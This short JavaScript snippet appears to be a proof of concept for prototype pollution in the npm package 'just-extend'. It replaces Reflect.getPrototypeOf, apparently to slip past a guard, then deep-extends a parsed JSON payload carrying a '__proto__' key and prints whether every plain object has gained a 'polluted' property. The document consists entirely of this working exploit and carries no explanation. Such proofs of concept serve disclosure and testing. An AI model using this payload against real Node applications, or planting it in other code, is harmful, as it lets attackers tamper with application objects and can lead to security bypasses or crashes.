Reflect.getPrototypeOf = () => false;
const extend = require('just-extend');
let obj = {};
console.log({}.polluted);
let payload2 = JSON.parse('{"__proto__": {"polluted": "yes"}}');
extend(true, {}, payload2);
console.log({}.polluted);